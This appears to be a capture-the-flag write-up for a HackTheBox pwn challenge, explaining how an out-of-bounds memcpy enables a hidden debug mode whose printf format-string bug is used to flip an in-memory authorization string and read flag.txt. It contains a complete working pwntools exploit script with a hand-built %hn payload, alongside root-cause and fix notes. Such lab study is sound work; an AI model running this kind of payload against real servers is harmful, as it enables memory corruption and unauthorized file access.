---
layout: post
title: "LiteServe"
date: 2027-11-04 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, format-string, out-of-bounds-write, buffer-overflow, authorization-bypass, no-pie]
---

A recovered "lightweight access node" runs a tiny custom HTTP server. It hides `flag.txt`, but `.txt` is only a served extension when an in-memory global `PRIV_MODE == "ON"` — and the deployed container never turns it on. The solve chains a 4-byte [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) (to silently enable a hidden *debug* mode) into the [format-string bug](https://cwe.mitre.org/data/definitions/134.html) that debug mode unlocks, and uses it to flip `PRIV_MODE` ourselves.

## Overview

`server` is a No-PIE, NX, stack-canary x86-64 binary that speaks just enough HTTP to serve a static page. `flag.txt` sits in its working directory, but the extension whitelist only allows `.txt` (and a handful of others) once a global authorization string `PRIV_MODE` equals `"ON"`. There is no request that sets it — so we corrupt memory to set it, then ask for the file.

## The technique

Three observations turn a "read-only static server" into an arbitrary file read:

1. **Adjacent-field overflow enables a hidden feature.** `get_mime_type()` safely copies *known* extensions with `strncpy(dst, src, 0x20)`, but its default branch — taken for any *unknown* extension — does `memcpy(ctx->mime_type /* 0x20 */, ctx->file_extension, 0x24)`. That is a 4-byte [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) straight into the adjacent struct member `ctx->debug`. Request a route whose first-dot extension is unknown and ≥ 33 bytes (`/a.` + `A`×40) and `debug` becomes non-zero.

2. **Debug mode unlocks a format string.** With `debug` set, `parse_headers()` prints the `User-Agent` value via `printf(user_agent)` — no format specifier — but only when the value begins with `"curl"`. That is a classic [uncontrolled format string](https://cwe.mitre.org/data/definitions/134.html): an arbitrary write primitive via `%n`.

3. **One minimal write flips the gate.** `PRIV_MODE` is the C string `"OFF\0"`; we only need `"ON\0"`. Since `"OFF"[0] == "ON"[0] == 'O'`, a single 2-byte `%hn` write of `0x004e` at `PRIV_MODE+1` sets `'N'` then a null. Writing only the differing bytes keeps exactly one (null-tailed) pointer at the end of the payload — crash-safe even when the header parser truncates at that null, which matters because the server is a single process with no `fork()`: a wrong write segfaults the whole service.

## Solution

The server handles connections in one persistent process, so the flipped `PRIV_MODE` global survives across connections. That gives a clean two-request solve: connection A corrupts memory and flips the gate; connection B simply asks for the flag.

Two practical traps make this harder than it looks:

- **The argument offset is fixed — measure it, don't brute-force it.** The debug `printf` output only goes to the server's own (block-buffered) stdout, so there's no client-visible leak. But the offset is deterministic (No-PIE, fixed stack layout): run the binary locally with unbuffered stdout (`stdbuf -o0 ./server`), send `curl` + an 8-byte marker + `%6$p..%17$p`, and read which slot echoes the marker. It's **8** (the 8 bytes right after the required `curl` prefix). Brute-forcing it live is actively harmful — a wrong `%n` segfaults the whole no-fork server.
- **Hand-write an all-positional payload.** `pwntools`' `fmtstr_payload()` emits a *mixed* string like `%74c%10$lln` (non-positional `%c` plus positional `$lln`). Mixing the two is undefined in glibc: it silently works on a Kali host but **crashes the Ubuntu-22.04 target**. Build it by hand instead — and always rebuild the challenge's own `Dockerfile` to test against the deployed glibc, not the host's.

`solve.py`:

```python
#!/usr/bin/env python3
import sys, re
from pwn import *
context.arch = "amd64"

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

PRIV_MODE = ELF("server", checksec=False).sym.PRIV_MODE      # 0x405169, No-PIE

# Request A: unknown long extension -> get_mime_type memcpy overflow sets ctx->debug;
# debug unlocks printf(User-Agent); flip PRIV_MODE "OFF\0" -> "ON\0" with ONE short %hn.
# All-positional, hand-written: "curl" 8-aligns the rest at arg 8; "%74c" prints 74 (+4
# from "curl" = 78 = 0x4e); "%10$hn" writes the short to the address that lands at arg 10.
fmt  = b"%74c%10$hn".ljust(16, b"a") + p64(PRIV_MODE + 1)
reqA = (b"GET /x." + b"A" * 40 + b" HTTP/1.1\r\nHost: localhost\r\n"
        b"User-Agent: curl" + fmt + b"\r\nConnection: close\r\n\r\n")
p = remote(HOST, PORT); p.send(reqA); p.recvall(timeout=5); p.close()

# Request B: PRIV_MODE persists (single process, no fork) -> .txt now whitelisted.
p = remote(HOST, PORT)
p.send(b"GET /flag.txt HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
resp = p.recvall(timeout=5).decode(errors="replace")
m = re.search(r"HTB\{[^}]+\}", resp)
print(m.group(0) if m else resp)
```

```console
$ python3 solve.py <target-ip> <target-port>
HTB{...}
```

## Why it worked

Two C bugs and one design mistake line up. The fixed `memcpy(..., 0x24)` into a `0x20` buffer is an off-by-design [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) into a security-relevant flag; the debug-gated `printf(user_input)` is a textbook [format-string vulnerability](https://cwe.mitre.org/data/definitions/134.html); and authorization is enforced by a *writable in-memory string* rather than by request identity, so corrupting memory is enough to grant privilege — no shell required.

## Fix / defense

- Bound the copy to the destination size: `memcpy(dst, src, sizeof(dst))` (or `min(len, 0x20)`), never a fixed `0x24` into a `0x20` buffer.
- Never call `printf(user_controlled)` — always `printf("%s", value)`. And don't hide an unsafe code path behind a "debug" flag that a memory bug can set.
- Don't gate authorization on a mutable process global. Derive privilege from the authenticated request, so a memory-corruption primitive can't simply flip `"OFF"` to `"ON"`.
